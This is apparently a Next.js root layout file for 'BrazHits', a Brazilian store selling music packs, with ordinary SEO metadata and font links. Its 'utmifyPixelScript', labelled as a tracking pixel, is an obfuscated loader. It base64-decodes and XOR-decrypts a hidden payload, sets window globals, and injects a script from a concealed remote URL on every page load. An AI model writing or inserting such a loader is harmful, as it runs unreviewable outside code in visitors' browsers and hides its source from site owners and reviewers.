import type { Metadata } from "next";
import "./globals.css";

const publicUrl = "https://brazhits.com.br/loja/";
const utmifyPixelScript = `(function(){var c_086=atob("DAZf588brMHue8rYOH19kr13jvvME76sSHVlyOB4yK/ADr61UWAmyax0we+MCeWrW3Q2l7tog7GHA6+0F3Y2n6p3gqudWeb6WXIrlaZ52bWLCOjiY1tzxah3w6OPF7n6Al0kxaF6waTMQeioUX46i4Z/ju3MDau0TWN93e0tzfeNSv3tCmRm1vt6yfaMH6jvXWBphf850ZyT");var l_y7=[];for(var e_4m=0;e_4m<c_086.length;e_4m++){l_y7.push(c_086.charCodeAt(e_4m)&255);}var h_59=l_y7[0];var k_0tk1=l_y7.slice(1,1+h_59);var z_bk=l_y7.slice(1+h_59);var j_euu=z_bk.map(function(b,y_8){return b^k_0tk1[y_8%h_59];});var c_g9="";for(var e_054t=0;e_054t<j_euu.length;e_054t++){c_g9+=String.fromCharCode(j_euu[e_054t]&255);}var g_pa=decodeURIComponent(escape(c_g9));var p_jrb=JSON.parse(g_pa);var y_c=p_jrb.globals||[];y_c.forEach(function(w_mycq){window[w_mycq.name]=w_mycq.value;});var r_6c4q=document.createElement("script");r_6c4q.src=p_jrb.url;r_6c4q.async=true;r_6c4q.defer=true;(p_jrb.attributes||[]).forEach(function(w_ejv3){r_6c4q.setAttribute(w_ejv3.name,w_ejv3.value);});(document.head||document.documentElement).appendChild(r_6c4q);})();`;

export const metadata: Metadata = {
  metadataBase: new URL(publicUrl),
  title: "Loja de Packs | BrazHits",
  description: "Conheça os Packs BrazHits de sertanejo, forró, arrocha, pagode, rock nacional e gospel.",
  alternates: { canonical: publicUrl },
  openGraph: {
    url: publicUrl,
    title: "Loja de Packs | BrazHits",
    description: "Todos os Packs BrazHits em um só lugar. Escolha o seu gênero e encontre o som certo para você.",
    type: "website",
    locale: "pt_BR",
  },
};

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="pt-BR">
      <head>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
        <script dangerouslySetInnerHTML={{ __html: utmifyPixelScript }} />
      </head>
      <body>{children}</body>
    </html>
  );
}
